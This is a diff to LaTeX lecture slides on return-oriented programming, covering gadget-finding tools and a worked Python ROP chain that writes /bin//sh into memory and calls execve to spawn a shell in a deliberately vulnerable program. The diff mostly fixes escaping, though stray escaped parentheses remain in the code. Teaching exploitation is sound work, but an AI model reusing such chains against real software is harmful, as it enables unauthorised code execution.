@@ -45,7 +45,7 @@
     \begin{itemize}
     \item A type attack that exploits buffer overruns
     \item Published by Hovav Shacham in 2007
-    \item Arised as a technique to counter security mechanisms (NX\)\)
+    \item Arised as a technique to counter security mechanisms (NX)
     \item Big binary $\rightarrow$ ROP is turing complete
     \item Many authors refer to ret-to-libc/library as ROP, according to the founder of this technique it has to be differentiated and ROP describes chaining of small code segments
     \end{itemize}
@@ -56,7 +56,7 @@
 \begin{frame}
     \frametitle{Overview}
     \begin{enumerate}
-        \item Search the binary for gadgets: return (0xC3\)\) bytes that contain useful instructions before
+        \item Search the binary for gadgets: return (0xC3) bytes that contain useful instructions before
         \item Generate a list of these gadgets, called ROP chain
         \item Generate a payload with the addresses of these gadgets
         \item Insert payload via buffer overrun
@@ -67,7 +67,7 @@
     \frametitle{ROP gadgets}
     \begin{itemize}
         \item Gadgets are machine instructions that end on a return
-        \item Tools: ROPgadget (\url{https://github.com/JonathanSalwan/ROPgadget}\)\), ropper (\url{https://github.com/sashs/Ropper}\)\), Radare2, pwntools....
+        \item Tools: ROPgadget (\url{https://github.com/JonathanSalwan/ROPgadget}), ropper (\url{https://github.com/sashs/Ropper}), Radare2, pwntools....
     \end{itemize}
     \begin{figure}[h]
         \caption{ROP Gadgets}
@@ -87,7 +87,7 @@
 \end{lstlisting}
     \begin{itemize}
         \item These allow us to write arbitrary values into registers
-        \item However, sometimes we do not find a pop into our desired register (e.g. r14\)\), here we can improvise and use something like
+        \item However, sometimes we do not find a pop into our desired register (e.g. r14), here we can improvise and use something like
     \end{itemize}
 \begin{lstlisting}[style=result]
 XOR r14, r14; pop r12; XOR r14, r12; ret;
@@ -138,7 +138,7 @@ int 0x80; ret;
 \subsection{Target Program and Compilation}
 \begin{frame}[fragile]
     \frametitle{Target Program and Compliation}
-    \bltCode{vuln.c}{c}{Target Program (stack protectors must be off\)\)}{targetprogram}
+    \bltCode{vuln.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
     \bltCommand{compilation.sh}{Compilation command}{comp}
 \end{frame}
 \subsection{General approach}
@@ -148,9 +148,9 @@ int 0x80; ret;
         \item Using ropper we can find our desired gadgets
         \item Lets say we want to execute a shell using execve, for that we need to accomplish the following goals
         \begin{enumerate}
-            \item write /bin/sh into memory (at the data segment\)\)
-            \item init systemcall number (11\)\)
-            \item init systemcall argument (address of /bin//sh\)\)
+            \item write /bin/sh into memory (at the data segment)
+            \item init systemcall number (11)
+            \item init systemcall argument (address of /bin//sh)
             \item call systemcall
         \end{enumerate}
     \end{itemize}
@@ -162,24 +162,24 @@ int 0x80; ret;
 from struct import pack
 
 p = 'AAAABBBBCCCC'
-p += str(pack\('<I', 0x080958b5\)\) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack\('<I', 0x080f0f6c\)\) # @ .data
-p += str(pack\('<I', 0x00000000\)\) # @ NULL
-p += str(pack\('<I', 0x080b526a\)\) # pop eax ; ret
+p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f6c) # @ .data
+p += str(pack\('<I', 0x00000000) # @ NULL
+p += str(pack\('<I', 0x080b526a) # pop eax ; ret
 p += '/bin'
-p += str(pack\('<I', 0x08059402\)\) # mov dword ptr [edx], eax ; ret
+p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
     \end{lstlisting}
 \end{frame}
 
 \begin{frame}[fragile]
     \frametitle{Generating the payload, writing //sh}
     \begin{lstlisting}[style=code, language=python]
-p += str(pack\('<I', 0x080958b5\)\) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack\('<I', 0x080f0f70\)\) # @ .data + 4
-p += str(pack\('<I', 0x00000000\)\) # @ NULL
-p += str(pack\('<I', 0x080b526a\)\) # pop eax ; ret
+p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f70) # @ .data + 4
+p += str(pack\('<I', 0x00000000) # @ NULL
+p += str(pack\('<I', 0x080b526a) # pop eax ; ret
 p += '//sh'
-p += str(pack\('<I', 0x08059402\)\) # mov dword ptr [edx], eax ; ret
+p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
     \end{lstlisting}
 \end{frame}
 
@@ -187,39 +187,39 @@ p += str(pack\('<I', 0x08059402\)\) # mov dword ptr [edx], eax ; ret
     \frametitle{Generating the payload, init params}
     \begin{lstlisting}[style=code, language=python]
 # write null byte after /bin/sh
-p += str(pack\('<I', 0x080958b5\)\) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack\('<I', 0x080f0f74\)\) # @ .data + 8
-p += str(pack\('<I', 0x00000000\)\) # @ NULL
-p += str(pack\('<I', 0x080506c0\)\) # xor eax, eax ; ret
-p += str(pack\('<I', 0x08059402\)\) # mov dword ptr [edx], eax ; ret
+p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f74) # @ .data + 8
+p += str(pack\('<I', 0x00000000) # @ NULL
+p += str(pack\('<I', 0x080506c0) # xor eax, eax ; ret
+p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
 # write address of /bin/sh to ebx
-p += str(pack\('<I', 0x08049022\)\) # pop ebx ; ret
-p += str(pack\('<I', 0x080f0f6c\)\) # @ .data
+p += str(pack\('<I', 0x08049022) # pop ebx ; ret
+p += str(pack\('<I', 0x080f0f6c) # @ .data
 # arguments and environment to ecx,edx
-p += str(pack\('<I', 0x0805e64f\)\) # pop ecx; add al, 0xf6; ret;
-p += str(pack\('<I', 0x080f0f74\)\) # @ .data + 8
-p += str(pack\('<I', 0x080958b5\)\) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack\('<I', 0x080f0f74\)\) # @ .data + 8
-p += str(pack\('<I', 0x00000000\)\) # @ NULL
+p += str(pack\('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
+p += str(pack\('<I', 0x080f0f74) # @ .data + 8
+p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
+p += str(pack\('<I', 0x080f0f74) # @ .data + 8
+p += str(pack\('<I', 0x00000000) # @ NULL
     \end{lstlisting}
 \end{frame}
 
 \begin{frame}[fragile]
     \frametitle{Generating the payload, init params, syscall}
     \begin{lstlisting}[style=code, language=python]
-p += str(pack\('<I', 0x080506c0\)\) # xor eax, eax ; ret
-p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e\)\) # inc eax ; ret
-p += str(pack\('<I', 0x08049b2a\)\) # int 0x80
+p += str(pack\('<I', 0x080506c0) # xor eax, eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
+p += str(pack\('<I', 0x08049b2a) # int 0x80
 print p
     \end{lstlisting}
 \end{frame}
